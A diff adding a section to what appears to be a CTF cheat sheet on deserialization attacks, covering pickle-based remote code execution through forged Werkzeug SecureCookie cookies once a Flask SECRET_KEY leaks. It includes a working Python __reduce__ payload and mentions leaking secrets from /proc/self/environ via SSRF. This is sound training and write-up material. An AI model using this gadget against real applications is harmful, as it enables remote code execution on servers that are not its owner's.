@@ -12,6 +12,7 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 - [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
 - [PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)](#php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018)
 - [Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)](#java-tiedmapentry--lazymap--reflection-hashmap-patch-trend-micro-2018)
+- [Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)](#werkzeug-securecookie-pickle-rce-after-secret_key-leak-csaw-2018-finals)
 
 ---
 
@@ -359,5 +360,27 @@ byte[] payload = out.toByteArray();
 **Key insight:** The Commons Collections `LazyMap` + `ChainedTransformer` primitive can call any static method, not just `Runtime.exec`. When a CTF challenge adds its own `Flag.getFlag()` helper expecting the JVM to enforce access control, the same gadget chain used for RCE gives you direct method invocation. The tricky part is that calling `outer.put(payload, "x")` while building the HashMap would immediately resolve the LazyMap and leak the flag to the builder process — use reflection (`Whitebox.setInternalState` from PowerMock, or raw `Field.setAccessible(true)`) to write the TiedMapEntry into `HashMap.table` after the map is otherwise populated.
 
 **References:** Trend Micro CTF 2018 — Raimund Genes Cup Misc 300, writeup 11293
+
+---
+
+## Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)
+
+**Pattern:** `werkzeug.contrib.securecookie.SecureCookie` serializes session data with `pickle`. Once the Flask `SECRET_KEY` leaks (for example via SSRF reading `/proc/self/environ`), any cookie re-signs cleanly, so a `__reduce__` gadget fires on deserialization.
+
+```python
+import pickle, subprocess
+from werkzeug.contrib.securecookie import SecureCookie
+
+class Pwn:
+    def __reduce__(self):
+        return (subprocess.check_output, (['cat', '/flag.txt'],))
+
+cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
+# Set Cookie: session=<cookie> and read the flag from the response
+```
+
+**Key insight:** Any framework that mixes `pickle` with HMAC-signed cookies is a SECRET_KEY leak away from RCE. Flask's default `itsdangerous` uses JSON, but older apps on `SecureCookie` or custom signers still ship pickle.
+
+**References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144
 
 ---
